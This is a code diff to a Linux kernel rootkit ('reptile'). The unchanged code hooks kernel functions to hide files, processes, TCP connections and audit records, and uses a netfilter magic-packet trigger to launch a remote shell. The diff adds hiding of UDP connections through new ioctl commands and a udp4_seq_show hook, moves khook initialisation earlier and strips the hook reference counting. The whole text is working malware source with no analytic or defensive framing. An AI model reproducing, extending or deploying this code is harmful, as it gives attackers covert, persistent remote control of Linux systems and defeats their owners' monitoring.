@@ -90,6 +90,7 @@ struct hidden_conn {
 };
 
 LIST_HEAD(hidden_tcp_conn);
+LIST_HEAD(hidden_udp_conn);
 
 void hide(void)
 {
@@ -179,20 +180,23 @@ int is_invisible(pid_t pid)
 
 	if (!pid)
 		return ret;
+
 	task = find_task(pid);
 	if (!task)
 		return ret;
+
 	if (task->flags & FLAG)
 		ret = 1;
+
 	put_task_struct(task);
 	return ret;
 }
 
-void exec(char **argv)
+int exec(char **argv)
 {
 	char *path = PATH;
 	char *envp[] = {path, NULL};
-	call_usermodehelper(argv[0], argv, envp, UMH_WAIT_PROC);
+	return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
 }
 
 void shell_execer(struct work_struct *work)
@@ -350,8 +354,7 @@ char **parse(char *line)
 		if (position >= bufsize) {
 			bufsize += TOK_BUFSIZE;
 			tokens_backup = tokens;
-			tokens = krealloc(tokens, bufsize * sizeof(char *),
-					  GFP_KERNEL);
+			tokens = krealloc(tokens, bufsize * sizeof(char *), GFP_KERNEL);
 			if (!tokens) {
 				kfree(tokens_backup);
 				return NULL;
@@ -386,10 +389,10 @@ void _sub(char *arg, int key, int nbytes)
 }
 
 unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
-			       struct sk_buff *socket_buffer,
-			       const struct net_device *in,
-			       const struct net_device *out,
-			       int (*okfn)(struct sk_buff *))
+			    			   struct sk_buff *socket_buffer,
+			    			   const struct net_device *in,
+							   const struct net_device *out,
+							   int (*okfn)(struct sk_buff *))
 {
 	const struct iphdr *ip_header;
 	const struct icmphdr *icmp_header;
@@ -434,8 +437,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 
 		if (//htons(tcp_header->seq) == SEQ &&   /* uncoment this if you wanna use tcp_header->seq as filter */
 		    htons(tcp_header->window) == WIN) {
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_tcph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_tcph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -450,9 +452,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct tcphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct tcphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -471,8 +472,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -500,8 +500,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(icmp_header->un.echo.sequence) == SEQ &&
 		    htons(icmp_header->un.echo.id) == WIN) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_icmph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_icmph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -516,9 +515,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct icmphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct icmphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -537,9 +535,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -567,8 +563,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 		if (htons(udp_header->len) <=
 		    (sizeof(struct udphdr) + strlen(TOKEN) + 25)) {
 
-			size = htons(ip_header->tot_len) - sizeof(_iph) -
-			       sizeof(_udph);
+			size = htons(ip_header->tot_len) - sizeof(_iph) - sizeof(_udph);
 
 			_data = kmalloc(size, GFP_KERNEL);
 
@@ -583,9 +578,8 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 			}
 
 			data = skb_header_pointer(socket_buffer,
-						  ip_header->ihl * 4 +
-						      sizeof(struct udphdr),
-						  size, &_data);
+						ip_header->ihl * 4 + sizeof(struct udphdr),
+						size, &_data);
 
 			if (!data) {
 				kfree(_data);
@@ -604,9 +598,7 @@ unsigned int magic_packet_hook(const struct nf_hook_ops *ops,
 				args = parse(string);
 
 				if (args) {
-					shell_exec_queue(SHELL, args[1],
-							 args[2], PASS);
-
+					shell_exec_queue(SHELL, args[1], args[2], PASS);
 					kfree(args);
 				}
 
@@ -629,10 +621,8 @@ static int khook_fillonedir(void *__buf, const char *name, int namlen,
 			    loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(fillonedir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(fillonedir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(fillonedir);
 	return ret;
 }
 
@@ -641,10 +631,8 @@ static int khook_filldir(void *__buf, const char *name, int namlen,
 			 loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(filldir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(filldir);
 	return ret;
 }
 
@@ -653,10 +641,8 @@ static int khook_filldir64(void *__buf, const char *name, int namlen,
 			   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(filldir64);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(filldir64, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(filldir64);
 	return ret;
 }
 
@@ -665,10 +651,8 @@ static int khook_compat_fillonedir(void *__buf, const char *name, int namlen,
 				   loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_fillonedir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_fillonedir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_fillonedir);
 	return ret;
 }
 
@@ -677,10 +661,8 @@ static int khook_compat_filldir(void *__buf, const char *name, int namlen,
 				loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_filldir);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_filldir);
 	return ret;
 }
 
@@ -690,10 +672,8 @@ static int khook_compat_filldir64(void *__buf, const char *name, int namlen,
 				  loff_t offset, u64 ino, unsigned int d_type)
 {
 	int ret = 0;
-	KHOOK_GET(compat_filldir64);
 	if (!strstr(name, HIDE) || !hidden)
 		ret = KHOOK_ORIGIN(compat_filldir64, __buf, name, namlen, offset, ino, d_type);
-	KHOOK_PUT(compat_filldir64);
 	return ret;
 }
 #endif
@@ -707,17 +687,14 @@ struct dentry *khook___d_lookup(struct dentry *parent, struct qstr *name)
 #endif
 {
 	struct dentry *found = NULL;
-	KHOOK_GET(__d_lookup);
 	if (!strstr(name->name, HIDE) || !hidden)
 		found = KHOOK_ORIGIN(__d_lookup, parent, name);
-	KHOOK_PUT(__d_lookup);
 	return found;
 }
 
 KHOOK_EXT(struct tgid_iter, next_tgid, struct pid_namespace *, struct tgid_iter);
 static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_iter iter)
 {
-	KHOOK_GET(next_tgid);
 	if (hidden) {
 		while ((iter = KHOOK_ORIGIN(next_tgid, ns, iter), iter.task) != NULL) {
 			if (!(iter.task->flags & FLAG))
@@ -728,8 +705,6 @@ static struct tgid_iter khook_next_tgid(struct pid_namespace *ns, struct tgid_it
 	} else {
 		iter = KHOOK_ORIGIN(next_tgid, ns, iter);
 	}
-
-	KHOOK_PUT(next_tgid);
 	return iter;
 }
 
@@ -739,7 +714,6 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf,
 {
 	ssize_t ret;
 
-	KHOOK_GET(vfs_read);
 	ret = KHOOK_ORIGIN(vfs_read, file, buf, count, pos);
 
 	if (file_tampering) {
@@ -747,7 +721,6 @@ static ssize_t khook_vfs_read(struct file *file, char __user *buf,
 			ret = hide_content(buf, ret);
 	}
 
-	KHOOK_PUT(vfs_read);
 	return ret;
 }
 
@@ -761,7 +734,6 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 	struct sockaddr_in addr;
 	struct hidden_conn *hc;
 
-	KHOOK_GET(inet_ioctl);
 	if (cmd == AUTH && arg == HTUA) {
 		if (control_flag) {
 			control_flag = 0;
@@ -846,6 +818,34 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 				}
 			}
 			break;
+		case 6:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			hc = kmalloc(sizeof(*hc), GFP_KERNEL);
+
+			if (!hc)
+				goto out;
+
+			hc->addr = addr;
+
+			list_add(&hc->list, &hidden_udp_conn);
+			break;
+		case 7:
+			if (copy_from_user(&addr, args.argv, sizeof(struct sockaddr_in)))
+				goto out;
+
+			list_for_each_entry(hc, &hidden_udp_conn, list)
+			{
+				if (addr.sin_port == hc->addr.sin_port &&
+				    addr.sin_addr.s_addr ==
+					hc->addr.sin_addr.s_addr) {
+					list_del(&hc->list);
+					kfree(hc);
+					break;
+				}
+			}
+			break;
 		default:
 			goto origin;
 		}
@@ -856,7 +856,6 @@ static int khook_inet_ioctl(struct socket *sock, unsigned int cmd,
 origin:
 	ret = KHOOK_ORIGIN(inet_ioctl, sock, cmd, arg);
 out:
-	KHOOK_PUT(inet_ioctl);
 	return ret;
 }
 
@@ -869,8 +868,6 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 	struct hidden_conn *hc;
 	unsigned short dport;
 	unsigned int daddr;
-
-	KHOOK_GET(tcp4_seq_show);
 
 	if (v == SEQ_START_TOKEN) {
 		goto origin;
@@ -897,7 +894,44 @@ static int khook_tcp4_seq_show(struct seq_file *seq, void *v)
 origin:
 	ret = KHOOK_ORIGIN(tcp4_seq_show, seq, v);
 out:
-	KHOOK_PUT(tcp4_seq_show);
+	return ret;
+}
+
+KHOOK_EXT(int, udp4_seq_show, struct seq_file *, void *);
+static int khook_udp4_seq_show(struct seq_file *seq, void *v)
+{
+	int ret;
+	struct sock *sk = v;
+	struct inet_sock *inet;
+	struct hidden_conn *hc;
+	unsigned short dport;
+	unsigned int daddr;
+
+	if (v == SEQ_START_TOKEN) {
+		goto origin;
+	}
+
+	inet = (struct inet_sock *)sk;
+
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(2, 6, 33)
+	dport = inet->inet_dport;
+	daddr = inet->inet_daddr;
+#else
+	dport = inet->dport;
+	daddr = inet->daddr;
+#endif
+
+	list_for_each_entry(hc, &hidden_udp_conn, list)
+	{
+		if ( //hc->addr.sin_port == dport &&
+		    hc->addr.sin_addr.s_addr == daddr) {
+			ret = 0;
+			goto out;
+		}
+	}
+origin:
+	ret = KHOOK_ORIGIN(udp4_seq_show, seq, v);
+out:
 	return ret;
 }
 
@@ -906,12 +940,9 @@ static int khook_load_elf_binary(struct linux_binprm *bprm)
 {
 	int ret = 0;
 
-	KHOOK_GET(load_elf_binary);
 	ret = KHOOK_ORIGIN(load_elf_binary, bprm);
 	if (!ret && !strcmp(bprm->filename, SHELL))
 		flag_tasks(current->pid, 1);
-
-	KHOOK_PUT(load_elf_binary);
 
 	return ret;
 }
@@ -921,12 +952,9 @@ static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
 {
 	int ret = 0;
 
-	KHOOK_GET(copy_creds);
 	ret = KHOOK_ORIGIN(copy_creds, p, clone_flags);
 	if (!ret && current->flags & FLAG)
 		p->flags |= FLAG;
-
-	KHOOK_PUT(copy_creds);
 
 	return ret;
 }
@@ -934,12 +962,9 @@ static int khook_copy_creds(struct task_struct *p, unsigned long clone_flags)
 KHOOK(exit_creds);
 static void khook_exit_creds(struct task_struct *p)
 {
-	KHOOK_GET(exit_creds);
 	KHOOK_ORIGIN(exit_creds, p);
 	if (p->flags & FLAG)
 		p->flags &= ~FLAG;
-
-	KHOOK_PUT(exit_creds);
 }
 
 KHOOK(audit_alloc);
@@ -947,13 +972,11 @@ static int khook_audit_alloc(struct task_struct *t)
 {
 	int err = 0;
 
-	KHOOK_GET(audit_alloc);
 	if (t->flags & FLAG) {
 		clear_tsk_thread_flag(t, TIF_SYSCALL_AUDIT);
 	} else {
 		err = KHOOK_ORIGIN(audit_alloc, t);
 	}
-	KHOOK_PUT(audit_alloc);
 	return err;
 }
 
@@ -962,12 +985,10 @@ struct task_struct *khook_find_task_by_vpid(pid_t vnr)
 {
 	struct task_struct *tsk = NULL;
 
-	KHOOK_GET(find_task_by_vpid);
 	tsk = KHOOK_ORIGIN(find_task_by_vpid, vnr);
 	if (tsk && (tsk->flags & FLAG) && !(current->flags & FLAG))
 		tsk = NULL;
 
-	KHOOK_PUT(find_task_by_vpid);
 	return tsk;
 }
 
@@ -977,6 +998,11 @@ static int __init reptile_init(void)
 	char *argv[] = {START, NULL, NULL};
 
 	work_queue = create_workqueue(WORKQUEUE);
+
+	ret = khook_init();
+
+	if (ret != 0)
+		goto out;
 
 	magic_packet_hook_options.hook = (void *)magic_packet_hook;
 	magic_packet_hook_options.hooknum = 0;
@@ -988,10 +1014,10 @@ static int __init reptile_init(void)
 #else
 	nf_register_hook(&magic_packet_hook_options);
 #endif
-	ret = khook_init();
+	
 	exec(argv);
 	hide();
-
+out:
 	return ret;
 }
 
